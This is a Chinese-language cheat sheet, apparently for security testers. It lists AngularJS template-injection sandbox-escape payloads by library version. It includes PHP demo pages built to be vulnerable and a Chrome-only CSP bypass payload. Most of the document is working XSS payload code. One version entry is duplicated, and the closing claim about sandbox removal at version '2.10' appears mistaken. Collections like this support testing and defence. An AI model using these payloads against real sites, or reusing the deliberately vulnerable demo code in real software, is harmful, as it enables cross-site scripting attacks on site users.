参考：
	- https://seaii-blog.com/index.php/2017/09/02/68.html

demo
```
<html ng-app>
<head>
    <script src="https://code.angularjs.org/{version}/angular.min.js"></script>
</head>
<body>
    <p>
    <?php
        $q = $_GET['q'];
        echo htmlspecialchars($q,ENT_QUOTES);
    ?>
</p>   
</body>
</html>
```

v1.0.1-v1.1.5
```javascript
{ constructor.constructor('alert(1)')() }
```

v1.2.0-v1.2.18
```javascript
{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }
```

v1.2.19-v1.2.23
```javascript
{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)  }
```

v1.2.19-v1.2.23
```javascript
{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)  }
```

v1.2.24-v1.2.26
![](/images/angularjs模板注入.png)

v1.2.27-v1.2.29/v1.3.0-v1.3.20(实际测试为v1.2.20-v1.2.32/v1.3.0-v1.3.20均生效。)
```javascript
{ {}.")));alert(1)//"; }
```

v1.4.0-v1.4.5（仅chrome）
```javascript
{ o={};l=o[['__lookupGetter__']];(l=l)('event')().target.defaultView.location='javascript:alert(1)'; }
```

v1.4.5-1.5.8 （仅chrome）
```javascript
{ x={y:''.constructor.prototype};x.y.charAt=[].join;[1]|orderBy:'x=alert(1)' }
```

v1.6.0-1.6.6
```javascript
{ [].pop.constructor('alert(1)')() }
```

csp bypass （仅chrome v1.4.0-v1.6.6）
```html
<html ng-app>
<head>
    <?php
        header("Content-Security-Policy:default-src 'self';script-src code.angularjs.org 'self'");
    ?>
    <script src="https://code.angularjs.org/{version}/angular.min.js"></script>
</head>
<body>
    <p>
    <?php
        echo $_GET['q'];
    ?>
</p>   
</body>
</html>
```
```javascript
<input+autofocus ng-focus="$event.path|orderBy:'!x?[].constructor.from([x=1],alert):0'">
```

2.10版本之后，AngularJS废除了沙盒机制